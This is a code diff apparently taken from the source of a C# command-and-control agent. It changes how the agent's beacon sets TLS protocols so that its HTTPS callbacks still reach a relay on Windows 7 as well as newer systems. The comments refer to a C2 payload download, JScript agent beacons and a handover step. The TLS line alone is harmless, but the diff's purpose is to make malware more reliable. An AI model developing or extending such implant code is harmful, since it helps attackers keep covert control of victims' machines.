@@ -24,12 +24,17 @@ namespace CSharpAgent
     {
         internal static void Run(string beaconUrl)
         {
-            // Modern hosts/CDNs refuse anything older than TLS 1.2, and the int-cast form works
-            // on CLR 2.0 where SecurityProtocolType.Tls12 doesn't exist (same trick C2Payload
-            // uses for the A_URL download). Old schannel stacks reject the value — swallowed.
+            // ADD Tls12 to the OS-default protocol mask — never REPLACE it. The Tls12-only
+            // assignment bricked stock Win7: its schannel predates TLS 1.2 (unless KB 3140245
+            // is installed), so the HTTPS beacon died before the first POST and the 0x0B
+            // handover reported a FALSE success. With |= Win10/11 still negotiate 1.2 while
+            // Win7 keeps its legacy protocols — the relay edge accepts TLS 1.0 (the JScript
+            // agent's own beacons ride it). The int-cast form works on CLR 2.0 where
+            // SecurityProtocolType.Tls12 doesn't exist (same trick C2Payload uses for the
+            // A_URL download); stacks that reject the value throw — swallowed.
             try
             {
-                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
             }
             catch { }
             try { ServicePointManager.Expect100Continue = false; }
